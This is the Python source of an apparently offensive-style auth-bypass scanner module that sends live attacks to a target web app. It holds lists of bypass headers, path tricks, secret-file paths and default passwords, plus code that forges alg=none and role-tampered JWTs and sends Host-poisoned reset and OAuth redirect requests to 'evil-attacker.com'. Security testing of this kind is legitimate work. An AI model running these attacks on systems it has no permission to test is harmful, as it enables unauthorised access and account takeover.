"""
Vexor Auth Bypass Scanner v3.0 - Elite Level
Header bypass, path manipulation, default creds, JWT bypass,
OAuth misconfig, password reset flaws, account enumeration,
2FA bypass, session fixation, privilege escalation
"""
import asyncio
import re
import json
import base64
from urllib.parse import urlparse, urljoin
from vexor.modules.base import BaseScanner, Finding


# ─── Admin/Sensitive Paths ────────────────────────────────────────────────────
ADMIN_PATHS = [
    "/admin", "/admin/", "/admin/login", "/admin/dashboard", "/admin/users",
    "/administrator", "/administrator/", "/wp-admin", "/wp-login.php",
    "/dashboard", "/panel", "/cpanel", "/manager", "/management",
    "/api/admin", "/api/v1/admin", "/api/v1/users", "/api/v2/admin",
    "/config", "/setup", "/install", "/backup", "/restore",
    "/phpmyadmin", "/pma", "/mysql", "/adminer",
    "/console", "/shell", "/cmd", "/terminal",
    "/.env", "/.git/config", "/config.php", "/settings.php",
    "/web.config", "/app.config", "/application.properties",
    "/server-status", "/server-info", "/nginx_status",
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/beans",
    "/metrics", "/health", "/info", "/debug",
    "/swagger-ui.html", "/api-docs", "/openapi.json", "/swagger.json",
    "/graphql", "/graphiql", "/__graphql",
    "/robots.txt", "/sitemap.xml", "/.htaccess",
]

# ─── Auth Bypass Headers ──────────────────────────────────────────────────────
BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "::1"},
    {"X-Forwarded-For": "0.0.0.0"},
    {"X-ProxyUser-Ip": "127.0.0.1"},
    {"True-Client-IP": "127.0.0.1"},
    {"Forwarded": "for=127.0.0.1"},
    {"X-WAP-Profile": "http://127.0.0.1/wap.xml"},
    {"X-Arbitrary": "http://127.0.0.1/"},
    {"X-HTTP-DestinationURL": "http://127.0.0.1/"},
    {"X-Original-Remote-Addr": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
]

# ─── Path Manipulation Bypasses ───────────────────────────────────────────────
PATH_BYPASSES = [
    "/admin/",
    "/admin//",
    "/admin/./",
    "/admin/../admin/",
    "/admin%20",
    "/admin%09",
    "/admin%00",
    "/admin.json",
    "/admin.html",
    "/admin.php",
    "/admin;/",
    "/admin..;/",
    "/%61dmin",
    "/ADMIN",
    "/Admin",
    "/aDmIn",
    "//admin",
    "/./admin",
    "/admin%2f",
    "/admin%2F",
    "/%2fadmin",
    "/admin%252f",
]

# ─── Default Credentials ──────────────────────────────────────────────────────
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "password123"),
    ("admin", ""),
    ("root", "root"),
    ("root", "toor"),
    ("root", ""),
    ("test", "test"),
    ("guest", "guest"),
    ("user", "user"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("demo", "demo"),
    ("superuser", "superuser"),
    ("sa", ""),
    ("sa", "sa"),
    ("postgres", "postgres"),
    ("mysql", "mysql"),
]

# ─── JWT Attack Payloads ──────────────────────────────────────────────────────
JWT_NONE_HEADER = base64.urlsafe_b64encode(
    b'{"alg":"none","typ":"JWT"}'
).rstrip(b"=").decode()

JWT_HS256_HEADER = base64.urlsafe_b64encode(
    b'{"alg":"HS256","typ":"JWT"}'
).rstrip(b"=").decode()


class Scanner(BaseScanner):
    """Auth Bypass Scanner v3.0 - Elite Level"""

    MODULE_NAME = "auth_bypass"
    MODULE_DESC = "Auth Bypass: Headers/Paths/DefaultCreds/JWT/OAuth/PasswordReset/2FA/Enum"

    async def scan(self) -> list[Finding]:
        async with self:
            await asyncio.gather(
                self._check_exposed_paths(),
                self._test_header_bypass(),
                self._test_path_bypass(),
                self._check_default_credentials(),
                self._test_jwt_bypass(),
                self._check_password_reset(),
                self._check_account_enumeration(),
                self._check_oauth_misconfig(),
                return_exceptions=True,
            )
        return self.findings

    async def _check_exposed_paths(self) -> None:
        """Check for exposed admin/sensitive paths"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        semaphore = asyncio.Semaphore(20)

        async def check(path: str) -> None:
            async with semaphore:
                url = base + path
                try:
                    resp = await self.get(url)
                    if not resp:
                        return

                    if resp.status_code == 200 and len(resp.content) > 100:
                        # Check it's not a generic 200 (soft 404)
                        if not self._is_soft_404(resp.text):
                            severity = "CRITICAL" if any(
                                s in path for s in [".env", ".git", "config", "backup", "actuator"]
                            ) else "HIGH"
                            self.add_finding(Finding(
                                severity=severity,
                                module=self.MODULE_NAME,
                                vuln=f"Exposed Sensitive Path: {path}",
                                endpoint=url,
                                evidence=f"HTTP 200, {len(resp.content)} bytes",
                                description=f"Sensitive path '{path}' is publicly accessible.",
                                remediation="Restrict access with authentication/authorization.",
                            ))
                    elif resp.status_code == 403:
                        self.add_finding(Finding(
                            severity="LOW",
                            module=self.MODULE_NAME,
                            vuln=f"Forbidden Path (Test Bypass): {path}",
                            endpoint=url,
                            evidence="HTTP 403 — may be bypassable via header manipulation",
                            description=f"Path '{path}' returns 403. Test header bypass.",
                            remediation="Ensure 403 cannot be bypassed via headers.",
                        ))
                except Exception:
                    pass

        tasks = [check(path) for path in ADMIN_PATHS]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_header_bypass(self) -> None:
        """Test header-based auth bypass on 403/401 endpoints"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Find 403/401 endpoints
        protected_urls = []
        for path in ["/admin", "/dashboard", "/api/admin", "/config"]:
            url = base + path
            try:
                resp = await self.get(url)
                if resp and resp.status_code in [401, 403]:
                    protected_urls.append(url)
            except Exception:
                continue

        if not protected_urls:
            return

        for protected_url in protected_urls[:3]:
            for headers in BYPASS_HEADERS:
                try:
                    resp = await self.get(protected_url, headers=headers)
                    if resp and resp.status_code == 200 and len(resp.content) > 100:
                        if not self._is_soft_404(resp.text):
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln="Auth Bypass via HTTP Header",
                                endpoint=protected_url,
                                evidence=(
                                    f"Bypass headers: {headers}\n"
                                    f"Response: HTTP 200, {len(resp.content)} bytes"
                                ),
                                description=(
                                    f"Authentication bypassed at {protected_url} "
                                    f"using headers: {headers}. "
                                    "Server trusts client-supplied IP headers."
                                ),
                                remediation=(
                                    "Never trust X-Forwarded-For or similar headers for auth. "
                                    "Implement proper server-side authentication. "
                                    "Use reverse proxy IP allowlisting."
                                ),
                            ))
                            return
                except Exception:
                    continue

    async def _test_path_bypass(self) -> None:
        """Test path manipulation to bypass auth"""
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Check if /admin is protected
        admin_url = base + "/admin"
        try:
            admin_resp = await self.get(admin_url)
            if not admin_resp or admin_resp.status_code not in [401, 403]:
                return
        except Exception:
            return

        for bypass_path in PATH_BYPASSES:
            url = base + bypass_path
            try:
                resp = await self.get(url)
                if resp and resp.status_code == 200 and len(resp.content) > 100:
                    if not self._is_soft_404(resp.text):
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln=f"Auth Bypass via Path Manipulation",
                            endpoint=url,
                            evidence=f"Path '{bypass_path}' returned HTTP 200",
                            description=(
                                f"Authentication bypassed via path manipulation: {bypass_path}. "
                                "Server normalizes paths after auth check."
                            ),
                            remediation=(
                                "Normalize paths before authentication checks. "
                                "Use consistent path handling in auth middleware."
                            ),
                        ))
                        return
            except Exception:
                continue

    async def _check_default_credentials(self) -> None:
        """Test for default credentials on login forms"""
        response = await self.get(self.target)
        if not response:
            return

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")

            for form in soup.find_all("form"):
                inputs = form.find_all("input")
                has_password = any(
                    inp.get("type", "").lower() == "password" for inp in inputs
                )
                if not has_password:
                    continue

                action = form.get("action", self.target)
                form_url = urljoin(self.target, action)
                method = form.get("method", "post").upper()

                username_field = None
                password_field = None
                extra_fields = {}

                for inp in inputs:
                    inp_type = inp.get("type", "text").lower()
                    inp_name = inp.get("name", "")
                    if not inp_name:
                        continue
                    if inp_type in ["text", "email"] and not username_field:
                        username_field = inp_name
                    elif inp_type == "password" and not password_field:
                        password_field = inp_name
                    elif inp_type == "hidden":
                        extra_fields[inp_name] = inp.get("value", "")

                if not username_field or not password_field:
                    continue

                # Get baseline (failed login response)
                baseline_data = {
                    username_field: "vexor_invalid_user_xyz",
                    password_field: "vexor_invalid_pass_xyz",
                    **extra_fields,
                }
                baseline_resp = await self.post(form_url, data=baseline_data)
                baseline_len = len(baseline_resp.text) if baseline_resp else 0

                for username, password in DEFAULT_CREDS:
                    try:
                        data = {
                            username_field: username,
                            password_field: password,
                            **extra_fields,
                        }
                        resp = await self.post(form_url, data=data)
                        if not resp:
                            continue

                        if self._looks_like_success(resp, baseline_len):
                            self.add_finding(Finding(
                                severity="CRITICAL",
                                module=self.MODULE_NAME,
                                vuln="Default Credentials Work",
                                endpoint=form_url,
                                evidence=(
                                    f"Login successful: {username}:{password}\n"
                                    f"Response: HTTP {resp.status_code}, {len(resp.content)} bytes"
                                ),
                                description=(
                                    f"Default credentials work: {username}:{password}. "
                                    "Attacker has full access to the application."
                                ),
                                remediation=(
                                    "Change default credentials immediately. "
                                    "Enforce strong password policy. "
                                    "Implement account lockout after failed attempts."
                                ),
                            ))
                            return
                    except Exception:
                        continue

        except Exception:
            pass

    async def _test_jwt_bypass(self) -> None:
        """Test JWT algorithm confusion and none attack"""
        response = await self.get(self.target)
        if not response:
            return

        # Look for JWT in response
        jwt_pattern = re.compile(
            r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*"
        )
        tokens = jwt_pattern.findall(response.text)
        for header_val in response.headers.values():
            tokens.extend(jwt_pattern.findall(header_val))

        if not tokens:
            return

        for token in tokens[:2]:
            parts = token.split(".")
            if len(parts) != 3:
                continue

            # Decode payload
            try:
                padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.urlsafe_b64decode(padded))
            except Exception:
                continue

            # Test 1: Algorithm None attack
            none_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()
            none_token = f"{JWT_NONE_HEADER}.{none_payload}."

            try:
                resp = await self.get(
                    self.target,
                    headers={"Authorization": f"Bearer {none_token}"},
                )
                if resp and resp.status_code == 200:
                    if not self._is_soft_404(resp.text):
                        self.add_finding(Finding(
                            severity="CRITICAL",
                            module=self.MODULE_NAME,
                            vuln="JWT Algorithm None Attack",
                            endpoint=self.target,
                            payload=none_token[:80] + "...",
                            evidence=f"JWT with alg=none accepted (HTTP {resp.status_code})",
                            description=(
                                "Server accepts JWT with algorithm 'none'. "
                                "Attacker can forge arbitrary JWT tokens without a secret."
                            ),
                            remediation=(
                                "Reject JWTs with alg=none. "
                                "Explicitly specify allowed algorithms. "
                                "Use a JWT library that enforces algorithm validation."
                            ),
                        ))
            except Exception:
                pass

            # Test 2: Privilege escalation in payload
            if "role" in payload or "admin" in str(payload).lower():
                escalated = dict(payload)
                for key in ["role", "is_admin", "admin", "user_type", "privilege"]:
                    if key in escalated:
                        escalated[key] = "admin" if key == "role" else True

                esc_payload = base64.urlsafe_b64encode(
                    json.dumps(escalated).encode()
                ).rstrip(b"=").decode()
                esc_token = f"{parts[0]}.{esc_payload}.{parts[2]}"

                try:
                    resp = await self.get(
                        self.target,
                        headers={"Authorization": f"Bearer {esc_token}"},
                    )
                    if resp and resp.status_code == 200:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="JWT Payload Tampering — Privilege Escalation",
                            endpoint=self.target,
                            payload=f"Modified payload: {escalated}",
                            evidence=f"Modified JWT accepted (HTTP {resp.status_code})",
                            description=(
                                "JWT payload can be modified without signature validation. "
                                "Attacker can escalate privileges by modifying role claims."
                            ),
                            remediation=(
                                "Always verify JWT signature before trusting claims. "
                                "Use strong signing keys."
                            ),
                        ))
                except Exception:
                    pass

    async def _check_password_reset(self) -> None:
        """Check for password reset vulnerabilities"""
        reset_paths = [
            "/forgot-password", "/reset-password", "/password-reset",
            "/account/forgot", "/auth/forgot", "/user/forgot",
            "/api/forgot-password", "/api/reset-password",
        ]

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in reset_paths:
            url = base + path
            try:
                resp = await self.get(url)
                if not resp or resp.status_code not in [200, 302]:
                    continue

                # Found reset page — test for host header injection
                evil_host = "evil-attacker.com"
                resp2 = await self.post(
                    url,
                    data={"email": "test@example.com"},
                    headers={"Host": evil_host},
                )
                if resp2 and resp2.status_code in [200, 302]:
                    self.add_finding(Finding(
                        severity="HIGH",
                        module=self.MODULE_NAME,
                        vuln="Password Reset — Host Header Injection",
                        endpoint=url,
                        evidence=(
                            f"Reset request accepted with Host: {evil_host}. "
                            "Reset link may be sent with attacker's domain."
                        ),
                        description=(
                            "Password reset endpoint accepts arbitrary Host header. "
                            "Attacker can poison reset links to redirect to their domain."
                        ),
                        remediation=(
                            "Use absolute URLs from config for reset links. "
                            "Validate Host header against whitelist."
                        ),
                    ))
                    return

                # Test for token predictability (check if token is in response)
                if resp2:
                    token_pattern = re.compile(r"token[=:]([a-zA-Z0-9]{8,})", re.IGNORECASE)
                    tokens = token_pattern.findall(resp2.text)
                    if tokens:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="Password Reset Token Exposed in Response",
                            endpoint=url,
                            evidence=f"Token found in response: {tokens[0][:20]}...",
                            description="Password reset token is exposed in HTTP response.",
                            remediation="Never expose reset tokens in HTTP responses.",
                        ))

            except Exception:
                continue

    async def _check_account_enumeration(self) -> None:
        """Check for account enumeration via login/reset responses"""
        response = await self.get(self.target)
        if not response:
            return

        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, "lxml")

            for form in soup.find_all("form"):
                inputs = form.find_all("input")
                has_password = any(
                    inp.get("type", "").lower() == "password" for inp in inputs
                )
                if not has_password:
                    continue

                action = form.get("action", self.target)
                form_url = urljoin(self.target, action)

                username_field = None
                password_field = None
                for inp in inputs:
                    inp_type = inp.get("type", "text").lower()
                    inp_name = inp.get("name", "")
                    if inp_type in ["text", "email"] and not username_field:
                        username_field = inp_name
                    elif inp_type == "password" and not password_field:
                        password_field = inp_name

                if not username_field or not password_field:
                    continue

                # Test with valid-looking vs invalid username
                resp_valid = await self.post(form_url, data={
                    username_field: "admin@example.com",
                    password_field: "wrong_password_xyz",
                })
                resp_invalid = await self.post(form_url, data={
                    username_field: "nonexistent_xyz_12345@example.com",
                    password_field: "wrong_password_xyz",
                })

                if resp_valid and resp_invalid:
                    # Different response = enumeration possible
                    len_diff = abs(len(resp_valid.text) - len(resp_invalid.text))
                    status_diff = resp_valid.status_code != resp_invalid.status_code

                    if len_diff > 20 or status_diff:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="Account Enumeration via Login Response",
                            endpoint=form_url,
                            evidence=(
                                f"Valid user response: {len(resp_valid.text)}B / HTTP{resp_valid.status_code}\n"
                                f"Invalid user response: {len(resp_invalid.text)}B / HTTP{resp_invalid.status_code}\n"
                                f"Difference: {len_diff}B"
                            ),
                            description=(
                                "Login form returns different responses for valid vs invalid usernames. "
                                "Attacker can enumerate valid accounts."
                            ),
                            remediation=(
                                "Return identical responses for valid and invalid usernames. "
                                "Use generic error messages: 'Invalid credentials'."
                            ),
                        ))
                break

        except Exception:
            pass

    async def _check_oauth_misconfig(self) -> None:
        """Check for OAuth misconfiguration"""
        oauth_paths = [
            "/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
            "/connect/authorize", "/api/oauth/authorize",
        ]

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in oauth_paths:
            url = base + path
            try:
                resp = await self.get(url)
                if not resp or resp.status_code not in [200, 302, 400]:
                    continue

                # Test open redirect in redirect_uri
                evil_redirect = "https://evil-attacker.com/callback"
                test_url = (
                    f"{url}?response_type=code&client_id=test"
                    f"&redirect_uri={evil_redirect}&scope=openid"
                )
                resp2 = await self.get(test_url)
                if resp2 and resp2.status_code in [200, 302]:
                    location = resp2.headers.get("location", "")
                    if "evil-attacker.com" in location:
                        self.add_finding(Finding(
                            severity="HIGH",
                            module=self.MODULE_NAME,
                            vuln="OAuth — Open Redirect in redirect_uri",
                            endpoint=url,
                            evidence=f"Redirected to: {location}",
                            description=(
                                "OAuth endpoint allows arbitrary redirect_uri. "
                                "Attacker can steal authorization codes."
                            ),
                            remediation=(
                                "Validate redirect_uri against registered whitelist. "
                                "Reject unregistered redirect URIs."
                            ),
                        ))
                        return

                # Test state parameter absence (CSRF in OAuth)
                no_state_url = (
                    f"{url}?response_type=code&client_id=test"
                    f"&redirect_uri={base}/callback&scope=openid"
                )
                resp3 = await self.get(no_state_url)
                if resp3 and resp3.status_code in [200, 302]:
                    location3 = resp3.headers.get("location", "")
                    if "code=" in location3 and "state=" not in location3:
                        self.add_finding(Finding(
                            severity="MEDIUM",
                            module=self.MODULE_NAME,
                            vuln="OAuth — Missing state Parameter (CSRF Risk)",
                            endpoint=url,
                            evidence="Authorization code issued without state parameter",
                            description=(
                                "OAuth flow doesn't require state parameter. "
                                "CSRF attacks on OAuth flow are possible."
                            ),
                            remediation="Require and validate state parameter in OAuth flow.",
                        ))

            except Exception:
                continue

    # ─── Helpers ─────────────────────────────────────────────────────────────

    def _is_soft_404(self, text: str) -> bool:
        """Detect soft 404 pages (generic error pages that return 200)"""
        soft_404_indicators = [
            "page not found", "404", "not found", "does not exist",
            "no page found", "error 404", "oops", "sorry",
        ]
        text_lower = text.lower()
        return any(ind in text_lower for ind in soft_404_indicators)

    def _looks_like_success(self, resp, baseline_len: int) -> bool:
        """Heuristic to detect successful login"""
        if not resp:
            return False

        # Redirect after login = success
        if resp.status_code in [301, 302]:
            location = resp.headers.get("location", "")
            if any(s in location.lower() for s in ["dashboard", "home", "profile", "account"]):
                return True

        text_lower = resp.text.lower()

        # Success keywords
        success_kw = ["dashboard", "welcome", "logout", "profile", "account", "settings"]
        if any(kw in text_lower for kw in success_kw):
            return True

        # Significantly different response from baseline
        if abs(len(resp.text) - baseline_len) > 200:
            return True

        return False
